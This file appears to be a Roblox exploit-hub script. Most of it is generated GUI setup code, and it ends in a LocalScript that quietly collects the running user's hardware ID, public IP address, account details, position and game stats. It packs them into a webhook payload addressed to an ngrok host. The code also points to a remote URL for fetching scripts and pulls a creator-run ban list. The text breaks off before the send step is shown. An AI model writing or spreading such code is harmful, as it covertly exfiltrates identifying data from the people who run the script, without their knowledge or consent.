_i[42].ImageColor3 = Color3.fromRGB(3,154,255)
_i[42].ImageRectOffset = Vector2.new(0,0)
_i[42].ImageRectSize = Vector2.new(0,0)
_i[42].ImageTransparency = 0
_i[42].ResampleMode = Enum.ResamplerMode.Default
_i[42].ScaleType = Enum.ScaleType.Stretch
_i[42].SliceCenter = Rect.new(0,0,0,0)
_i[42].SliceScale = 1
_i[42].Name = [[Color]]
_i[42].Parent = _i[40]

_i[43] = Instance.new("UIAspectRatioConstraint")
_i[43].AspectRatio = 10.218390464782715
_i[43].AspectType = Enum.AspectType.FitWithinMaxSize
_i[43].DominantAxis = Enum.DominantAxis.Width
_i[43].Name = [[UIAspectRatioConstraint]]
_i[43].Parent = _i[42]

_i[44] = Instance.new("TextLabel")
_i[44].AnchorPoint = Vector2.new(0,0)
_i[44].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[44].BackgroundTransparency = 1
_i[44].BorderColor3 = Color3.fromRGB(0,0,0)
_i[44].BorderSizePixel = 0
_i[44].ClipsDescendants = false
_i[44].LayoutOrder = 0
_i[44].Position = UDim2.new(0.852321,0,-0.0607162,0)
_i[44].Rotation = 0
_i[44].Selectable = false
_i[44].Size = UDim2.new(0.146566,0,0.789311,0)
_i[44].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[44].Visible = true
_i[44].ZIndex = 40
_i[44].Font = Enum.Font.SourceSansBold
_i[44].LineHeight = 1
_i[44].MaxVisibleGraphemes = -1
_i[44].RichText = false
_i[44].Text = [[v5]]
_i[44].TextColor3 = Color3.fromRGB(255,255,255)
_i[44].TextScaled = true
_i[44].TextSize = 14
_i[44].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[44].TextStrokeTransparency = 1
_i[44].TextTransparency = 0
_i[44].TextTruncate = Enum.TextTruncate.None
_i[44].TextWrapped = true
_i[44].TextXAlignment = Enum.TextXAlignment.Center
_i[44].TextYAlignment = Enum.TextYAlignment.Center
_i[44].Name = [[TextLabel]]
_i[44].Parent = _i[42]

_i[45] = Instance.new("UIStroke")
_i[45].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[45].Color = Color3.fromRGB(255,255,255)
_i[45].Enabled = true
_i[45].LineJoinMode = Enum.LineJoinMode.Round
_i[45].Thickness = 2.5999999046325684
_i[45].Transparency = 0
_i[45].Name = [[UIStroke]]
_i[45].Parent = _i[44]

_i[46] = Instance.new("UIGradient")
_i[46].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,17,255)),ColorSequenceKeypoint.new(0.489185,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(0.50416,Color3.fromRGB(0,68,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(204,0,255))})
_i[46].Enabled = true
_i[46].Offset = Vector2.new(0,0)
_i[46].Rotation = 0
_i[46].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[46].Name = [[UIGradient]]
_i[46].Parent = _i[45]

_i[47] = Instance.new("UIGradient")
_i[47].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(124,124,124)),ColorSequenceKeypoint.new(0.131448,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[47].Enabled = true
_i[47].Offset = Vector2.new(0,0)
_i[47].Rotation = 0
_i[47].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[47].Name = [[UIGradient]]
_i[47].Parent = _i[42]

_i[48] = Instance.new("TextLabel")
_i[48].AnchorPoint = Vector2.new(0.5,0.5)
_i[48].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[48].BackgroundTransparency = 1
_i[48].BorderColor3 = Color3.fromRGB(0,0,0)
_i[48].BorderSizePixel = 0
_i[48].ClipsDescendants = false
_i[48].LayoutOrder = 0
_i[48].Position = UDim2.new(0.346311,0,0.512949,0)
_i[48].Rotation = 0
_i[48].Selectable = false
_i[48].Size = UDim2.new(0.58485,0,0.604167,0)
_i[48].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[48].Visible = true
_i[48].ZIndex = 1
_i[48].Font = Enum.Font.Merriweather
_i[48].LineHeight = 1
_i[48].MaxVisibleGraphemes = -1
_i[48].RichText = false
_i[48].Text = [[SOFT-HUB]]
_i[48].TextColor3 = Color3.fromRGB(255,255,255)
_i[48].TextScaled = true
_i[48].TextSize = 14
_i[48].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[48].TextStrokeTransparency = 1
_i[48].TextTransparency = 0
_i[48].TextTruncate = Enum.TextTruncate.None
_i[48].TextWrapped = true
_i[48].TextXAlignment = Enum.TextXAlignment.Left
_i[48].TextYAlignment = Enum.TextYAlignment.Center
_i[48].Name = [[TextLabel]]
_i[48].Parent = _i[38]

_i[49] = Instance.new("UIPadding")
_i[49].PaddingBottom = UDim.new(0,0)
_i[49].PaddingLeft = UDim.new(0,0)
_i[49].PaddingRight = UDim.new(0,0)
_i[49].PaddingTop = UDim.new(0,0)
_i[49].Name = [[UIPadding]]
_i[49].Parent = _i[48]

_i[50] = Instance.new("UIGradient")
_i[50].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(85,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[50].Enabled = true
_i[50].Offset = Vector2.new(0,0)
_i[50].Rotation = 90
_i[50].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[50].Name = [[UIGradient]]
_i[50].Parent = _i[48]

_i[51] = Instance.new("UIStroke")
_i[51].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[51].Color = Color3.fromRGB(255,255,255)
_i[51].Enabled = true
_i[51].LineJoinMode = Enum.LineJoinMode.Round
_i[51].Thickness = 3.9000000953674316
_i[51].Transparency = 0
_i[51].Name = [[UIStroke]]
_i[51].Parent = _i[48]

_i[52] = Instance.new("UIGradient")
_i[52].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(54,55,57)),ColorSequenceKeypoint.new(0.0415973,Color3.fromRGB(3,154,255)),ColorSequenceKeypoint.new(0.470882,Color3.fromRGB(2,134,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,110,255))})
_i[52].Enabled = true
_i[52].Offset = Vector2.new(0,0)
_i[52].Rotation = 0
_i[52].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.874317,0),NumberSequenceKeypoint.new(0.126027,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[52].Name = [[UIGradient]]
_i[52].Parent = _i[51]

_i[53] = Instance.new("ImageLabel")
_i[53].AnchorPoint = Vector2.new(0,0)
_i[53].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[53].BackgroundTransparency = 1
_i[53].BorderColor3 = Color3.fromRGB(0,0,0)
_i[53].BorderSizePixel = 0
_i[53].ClipsDescendants = false
_i[53].LayoutOrder = 0
_i[53].Position = UDim2.new(0.516518,0,0.254884,0)
_i[53].Rotation = 0
_i[53].Selectable = false
_i[53].Size = UDim2.new(0.067205,0,0.484212,0)
_i[53].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[53].Visible = true
_i[53].ZIndex = 1
_i[53].Image = [[rbxassetid://123965417468651]]
_i[53].ImageColor3 = Color3.fromRGB(255,255,255)
_i[53].ImageRectOffset = Vector2.new(0,0)
_i[53].ImageRectSize = Vector2.new(0,0)
_i[53].ImageTransparency = 0
_i[53].ResampleMode = Enum.ResamplerMode.Default
_i[53].ScaleType = Enum.ScaleType.Stretch
_i[53].SliceCenter = Rect.new(0,0,0,0)
_i[53].SliceScale = 1
_i[53].Name = [[ImageLabel]]
_i[53].Parent = _i[38]

_i[54] = Instance.new("TextLabel")
_i[54].AnchorPoint = Vector2.new(0,0)
_i[54].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[54].BackgroundTransparency = 1
_i[54].BorderColor3 = Color3.fromRGB(0,0,0)
_i[54].BorderSizePixel = 0
_i[54].ClipsDescendants = false
_i[54].LayoutOrder = 0
_i[54].Position = UDim2.new(0.828571,0,0.242424,0)
_i[54].Rotation = 0
_i[54].Selectable = false
_i[54].Size = UDim2.new(2.17143,0,0.727273,0)
_i[54].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[54].Visible = true
_i[54].ZIndex = 1
_i[54].Font = Enum.Font.SourceSansBold
_i[54].LineHeight = 1
_i[54].MaxVisibleGraphemes = -1
_i[54].RichText = false
_i[54].Text = [[100110]]
_i[54].TextColor3 = Color3.fromRGB(255,255,255)
_i[54].TextScaled = true
_i[54].TextSize = 14
_i[54].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[54].TextStrokeTransparency = 1
_i[54].TextTransparency = 0
_i[54].TextTruncate = Enum.TextTruncate.None
_i[54].TextWrapped = true
_i[54].TextXAlignment = Enum.TextXAlignment.Left
_i[54].TextYAlignment = Enum.TextYAlignment.Center
_i[54].Name = [[pomlk1]]
_i[54].Parent = _i[53]

_i[55] = Instance.new("UIStroke")
_i[55].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[55].Color = Color3.fromRGB(0,85,255)
_i[55].Enabled = true
_i[55].LineJoinMode = Enum.LineJoinMode.Round
_i[55].Thickness = 2.799999952316284
_i[55].Transparency = 0
_i[55].Name = [[UIStroke]]
_i[55].Parent = _i[54]

_i[56] = Instance.new("TextButton")
_i[56].AnchorPoint = Vector2.new(0.5,0.5)
_i[56].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[56].BackgroundTransparency = 1
_i[56].BorderColor3 = Color3.fromRGB(0,0,0)
_i[56].BorderSizePixel = 0
_i[56].ClipsDescendants = false
_i[56].LayoutOrder = 0
_i[56].Position = UDim2.new(0.103754,0,0.220731,0)
_i[56].Rotation = 0
_i[56].Selectable = true
_i[56].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[56].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[56].Visible = true
_i[56].ZIndex = 1
_i[56].AutoButtonColor = true
_i[56].Font = Enum.Font.SourceSans
_i[56].LineHeight = 1
_i[56].Modal = false
_i[56].RichText = false
_i[56].Selected = false
_i[56].Text = [[]]
_i[56].TextColor3 = Color3.fromRGB(0,0,0)
_i[56].TextScaled = false
_i[56].TextSize = 14
_i[56].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[56].TextStrokeTransparency = 1
_i[56].TextTransparency = 0
_i[56].TextWrapped = false
_i[56].TextXAlignment = Enum.TextXAlignment.Center
_i[56].TextYAlignment = Enum.TextYAlignment.Center
_i[56].Name = [[Bouton discord]]
_i[56].Parent = _i[3]

_i[57] = Instance.new("ImageLabel")
_i[57].AnchorPoint = Vector2.new(0,0)
_i[57].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[57].BackgroundTransparency = 1
_i[57].BorderColor3 = Color3.fromRGB(0,0,0)
_i[57].BorderSizePixel = 0
_i[57].ClipsDescendants = false
_i[57].LayoutOrder = 0
_i[57].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[57].Rotation = 0
_i[57].Selectable = false
_i[57].Size = UDim2.new(1,0,1,0)
_i[57].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[57].Visible = true
_i[57].ZIndex = 1
_i[57].Image = [[rbxassetid://127885216293809]]
_i[57].ImageColor3 = Color3.fromRGB(255,255,255)
_i[57].ImageRectOffset = Vector2.new(0,0)
_i[57].ImageRectSize = Vector2.new(0,0)
_i[57].ImageTransparency = 0
_i[57].ResampleMode = Enum.ResamplerMode.Default
_i[57].ScaleType = Enum.ScaleType.Stretch
_i[57].SliceCenter = Rect.new(0,0,0,0)
_i[57].SliceScale = 1
_i[57].Name = [[ImageLabel]]
_i[57].Parent = _i[56]

_i[58] = Instance.new("TextButton")
_i[58].AnchorPoint = Vector2.new(0.5,0.5)
_i[58].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[58].BackgroundTransparency = 1
_i[58].BorderColor3 = Color3.fromRGB(0,0,0)
_i[58].BorderSizePixel = 0
_i[58].ClipsDescendants = false
_i[58].LayoutOrder = 0
_i[58].Position = UDim2.new(0.248705,0,0.220731,0)
_i[58].Rotation = 0
_i[58].Selectable = true
_i[58].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[58].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[58].Visible = true
_i[58].ZIndex = 1
_i[58].AutoButtonColor = true
_i[58].Font = Enum.Font.SourceSans
_i[58].LineHeight = 1
_i[58].Modal = false
_i[58].RichText = false
_i[58].Selected = false
_i[58].Text = [[]]
_i[58].TextColor3 = Color3.fromRGB(0,0,0)
_i[58].TextScaled = false
_i[58].TextSize = 14
_i[58].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[58].TextStrokeTransparency = 1
_i[58].TextTransparency = 0
_i[58].TextWrapped = false
_i[58].TextXAlignment = Enum.TextXAlignment.Center
_i[58].TextYAlignment = Enum.TextYAlignment.Center
_i[58].Name = [[Jeux actifs ]]
_i[58].Parent = _i[3]

_i[59] = Instance.new("ImageLabel")
_i[59].AnchorPoint = Vector2.new(0,0)
_i[59].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[59].BackgroundTransparency = 1
_i[59].BorderColor3 = Color3.fromRGB(0,0,0)
_i[59].BorderSizePixel = 0
_i[59].ClipsDescendants = false
_i[59].LayoutOrder = 0
_i[59].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[59].Rotation = 0
_i[59].Selectable = false
_i[59].Size = UDim2.new(1,0,1,0)
_i[59].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[59].Visible = true
_i[59].ZIndex = 1
_i[59].Image = [[rbxassetid://97341895929094]]
_i[59].ImageColor3 = Color3.fromRGB(255,255,255)
_i[59].ImageRectOffset = Vector2.new(0,0)
_i[59].ImageRectSize = Vector2.new(0,0)
_i[59].ImageTransparency = 0
_i[59].ResampleMode = Enum.ResamplerMode.Default
_i[59].ScaleType = Enum.ScaleType.Stretch
_i[59].SliceCenter = Rect.new(0,0,0,0)
_i[59].SliceScale = 1
_i[59].Name = [[ImageLabel]]
_i[59].Parent = _i[58]

_i[60] = Instance.new("TextButton")
_i[60].AnchorPoint = Vector2.new(0.5,0.5)
_i[60].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[60].BackgroundTransparency = 1
_i[60].BorderColor3 = Color3.fromRGB(0,0,0)
_i[60].BorderSizePixel = 0
_i[60].ClipsDescendants = false
_i[60].LayoutOrder = 0
_i[60].Position = UDim2.new(0.175467,0,0.220731,0)
_i[60].Rotation = 0
_i[60].Selectable = true
_i[60].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[60].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[60].Visible = true
_i[60].ZIndex = 1
_i[60].AutoButtonColor = true
_i[60].Font = Enum.Font.SourceSans
_i[60].LineHeight = 1
_i[60].Modal = false
_i[60].RichText = false
_i[60].Selected = false
_i[60].Text = [[]]
_i[60].TextColor3 = Color3.fromRGB(0,0,0)
_i[60].TextScaled = false
_i[60].TextSize = 14
_i[60].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[60].TextStrokeTransparency = 1
_i[60].TextTransparency = 0
_i[60].TextWrapped = false
_i[60].TextXAlignment = Enum.TextXAlignment.Center
_i[60].TextYAlignment = Enum.TextYAlignment.Center
_i[60].Name = [[Bouton YouTube]]
_i[60].Parent = _i[3]

_i[61] = Instance.new("ImageLabel")
_i[61].AnchorPoint = Vector2.new(0,0)
_i[61].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[61].BackgroundTransparency = 1
_i[61].BorderColor3 = Color3.fromRGB(0,0,0)
_i[61].BorderSizePixel = 0
_i[61].ClipsDescendants = false
_i[61].LayoutOrder = 0
_i[61].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[61].Rotation = 0
_i[61].Selectable = false
_i[61].Size = UDim2.new(1,0,1,0)
_i[61].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[61].Visible = true
_i[61].ZIndex = 1
_i[61].Image = [[rbxassetid://100375375569274]]
_i[61].ImageColor3 = Color3.fromRGB(255,255,255)
_i[61].ImageRectOffset = Vector2.new(0,0)
_i[61].ImageRectSize = Vector2.new(0,0)
_i[61].ImageTransparency = 0
_i[61].ResampleMode = Enum.ResamplerMode.Default
_i[61].ScaleType = Enum.ScaleType.Stretch
_i[61].SliceCenter = Rect.new(0,0,0,0)
_i[61].SliceScale = 1
_i[61].Name = [[ImageLabel]]
_i[61].Parent = _i[60]

_i[62] = Instance.new("TextButton")
_i[62].AnchorPoint = Vector2.new(0.5,0.5)
_i[62].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[62].BackgroundTransparency = 1
_i[62].BorderColor3 = Color3.fromRGB(0,0,0)
_i[62].BorderSizePixel = 0
_i[62].ClipsDescendants = false
_i[62].LayoutOrder = 0
_i[62].Position = UDim2.new(0.323469,0,0.220731,0)
_i[62].Rotation = 0
_i[62].Selectable = true
_i[62].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[62].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[62].Visible = true
_i[62].ZIndex = 1
_i[62].AutoButtonColor = true
_i[62].Font = Enum.Font.SourceSans
_i[62].LineHeight = 1
_i[62].Modal = false
_i[62].RichText = false
_i[62].Selected = false
_i[62].Text = [[]]
_i[62].TextColor3 = Color3.fromRGB(0,0,0)
_i[62].TextScaled = false
_i[62].TextSize = 14
_i[62].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[62].TextStrokeTransparency = 1
_i[62].TextTransparency = 0
_i[62].TextWrapped = false
_i[62].TextXAlignment = Enum.TextXAlignment.Center
_i[62].TextYAlignment = Enum.TextYAlignment.Center
_i[62].Name = [[Bouton Messagerie]]
_i[62].Parent = _i[3]

_i[63] = Instance.new("ImageLabel")
_i[63].AnchorPoint = Vector2.new(0,0)
_i[63].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[63].BackgroundTransparency = 1
_i[63].BorderColor3 = Color3.fromRGB(0,0,0)
_i[63].BorderSizePixel = 0
_i[63].ClipsDescendants = false
_i[63].LayoutOrder = 0
_i[63].Position = UDim2.new(-0.0425532,0,-3.54856e-07,0)
_i[63].Rotation = 0
_i[63].Selectable = false
_i[63].Size = UDim2.new(1,0,1,0)
_i[63].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[63].Visible = true
_i[63].ZIndex = 1
_i[63].Image = [[rbxassetid://99676060309840]]
_i[63].ImageColor3 = Color3.fromRGB(255,255,255)
_i[63].ImageRectOffset = Vector2.new(0,0)
_i[63].ImageRectSize = Vector2.new(0,0)
_i[63].ImageTransparency = 0
_i[63].ResampleMode = Enum.ResamplerMode.Default
_i[63].ScaleType = Enum.ScaleType.Stretch
_i[63].SliceCenter = Rect.new(0,0,0,0)
_i[63].SliceScale = 1
_i[63].Name = [[ImageLabel]]
_i[63].Parent = _i[62]

_i[64] = Instance.new("TextButton")
_i[64].AnchorPoint = Vector2.new(0,0)
_i[64].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[64].BackgroundTransparency = 1
_i[64].BorderColor3 = Color3.fromRGB(0,0,0)
_i[64].BorderSizePixel = 0
_i[64].ClipsDescendants = false
_i[64].LayoutOrder = 0
_i[64].Position = UDim2.new(0.199219,0,0.178406,0)
_i[64].Rotation = 0
_i[64].Selectable = true
_i[64].Size = UDim2.new(0.602514,0,0.133812,0)
_i[64].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[64].Visible = true
_i[64].ZIndex = 0
_i[64].AutoButtonColor = true
_i[64].Font = Enum.Font.SourceSans
_i[64].LineHeight = 1
_i[64].Modal = false
_i[64].RichText = false
_i[64].Selected = false
_i[64].Text = [[]]
_i[64].TextColor3 = Color3.fromRGB(0,0,0)
_i[64].TextScaled = false
_i[64].TextSize = 14
_i[64].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[64].TextStrokeTransparency = 1
_i[64].TextTransparency = 0
_i[64].TextWrapped = false
_i[64].TextXAlignment = Enum.TextXAlignment.Center
_i[64].TextYAlignment = Enum.TextYAlignment.Center
_i[64].Name = [[Bouton de déplacement]]
_i[64].Parent = _i[2]

_i[65] = Instance.new("UIAspectRatioConstraint")
_i[65].AspectRatio = 1.7794253826141357
_i[65].AspectType = Enum.AspectType.FitWithinMaxSize
_i[65].DominantAxis = Enum.DominantAxis.Width
_i[65].Name = [[UIAspectRatioConstraint]]
_i[65].Parent = _i[2]


-- FAKE REQUIRE SYSTEM FOR MODULES
local _modules = {}
local old_require = require
local require = function(module)
	if _modules[module] then
		if type(_modules[module]) == 'function' then
			_modules[module] = _modules[module]()
		end
		return _modules[module]
	end
	return old_require(module)
end

-- Scripts:

local function QAIEU_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local gui = player:WaitForChild("PlayerGui"):WaitForChild("Mot de passe Stats")
	gui.ResetOnSpawn = false
	ResetOnSpawn = false
	
end
coroutine.wrap(QAIEU_fake_script)()

local function FMQXZ_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local UserInputService = game:GetService("UserInputService")
	local Stats = game:GetService("Stats")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	
	local API_URL = "https://v0-roblox-account-integration.vercel.app/api/vip/check"
	local WEBHOOK_URL = "http://sighing-gauze-charcoal.ngrok-free.dev/api/webhooks/2/fDVVrO0sgtWaOCB9vLznP9JJNtllc6Tw"
	local BAN_URL = "https://raw.githubusercontent.com/Audinay/UFIL/refs/heads/main/Id%C3%A9e%20de%20joueur.ban"
	
	-- === CONFIGURATION MULTIVERSE (CORRIGÉE) ===
	-- On ajoute bien /api/get_script à la fin du lien Ngrok
	local NGROK_MULTIVERSE = "https://sighing-gauze-charcoal.ngrok-free.dev/api/get_script"
	
	local ID_CREATEUR = 9547606904
	
	local gui = script.Parent 
	_G.IsVipActive = false 
	local isHubLoaded = false
	local kickTimerStarted = false
	local webhookSent = false 
	
	-- ==========================================
	-- 0. SYSTÈME DE BANNISSEMENT GLOBAL (BLACKLIST)
	-- ==========================================
	local function checkBanList()
		local success, banData = pcall(function() return game:HttpGet(BAN_URL) end)
		if success and banData then
			for bannedId in string.gmatch(banData, "%d+") do
				if tonumber(bannedId) == LocalPlayer.UserId then
					LocalPlayer:Kick("You have been banned by the script creator for unknown reasons, but perhaps you upset them. This action is irrevocable. You are permanently banned from this script until the creator unbans you.")
					return true 
				end
			end
		end
		return false
	end
	
	if checkBanList() then return end
	
	-- ==========================================
	-- 1. DÉTECTION EXÉCUTEUR & HWID
	-- ==========================================
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	local hwid = "Non supporté par l'exécuteur"
	task.spawn(function()
		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
	end)
	
	-- ==========================================
	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
	-- ==========================================
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
		local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
		if success and response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
		end
		return fallbackImage
	end
	
	local function sendDiscordLog(isVip)
		if not httpRequest or webhookSent then return end
		webhookSent = true 
	
		task.spawn(function()
			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local playerCount = #Players:GetPlayers()
			local maxPlayers = Players.MaxPlayers
	
			local deviceType = "Ordinateur 💻"
			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
	
			local ping = "Inconnu"
			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
	
			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
	
			local char = LocalPlayer.Character
			local humanoid = char and char:FindFirstChild("Humanoid")
			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
	
			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
	
			local positionTxt = "Inconnue"
			if rootPart then
				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
			end
			
			local apiUrl = "https://api.ipify.org"
	
			local function recupererAdresseIP()
				local executionReussie, resultat = pcall(function()
					return game:HttpGet(apiUrl)
				end)
	
				-- Vérification du résultat de la requête
				if executionReussie then
					return resultat
				else
					return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
				end
			end
	
			-- Appel de la fonction et stockage de l'IP dans une variable
			local adresseIPPublique = recupererAdresseIP()
			
			local moneyInfo = "Non détecté"
			if LocalPlayer:FindFirstChild("leaderstats") then
				local stats = {}
				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
				end
				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
			end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
			local embedColor = isVip and 5763719 or 15548997
			local embedTitle = isVip and "🟢 INJECTION RÉUSSIE (ACCÈS VIP VALIDÉ)" or "🔴 INJECTION (EN ATTENTE DE VIP)"
			local embedDesc = "Le joueur a exécuté le script avec **" .. executorName .. "**.\n\n" .. (isVip and "✅ **Statut :** VIP Activé sur le site." or "❌ **Statut :** VIP Non activé.")
	
			local payload = {
				["username"] = "SORONICE Intel",
				["avatar_url"] = myAvatar,
				["content"] = "||@everyone|| **Nouveau log détecté !**", 
				["embeds"] = {{
					["title"] = embedTitle, ["description"] = embedDesc, ["color"] = embedColor, ["thumbnail"] = { ["url"] = myAvatar },
					["fields"] = {
						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					["footer"] = { ["text"] = "SORONICE HUB Logger • ID Serveur: " .. game.JobId }
				}}
			}
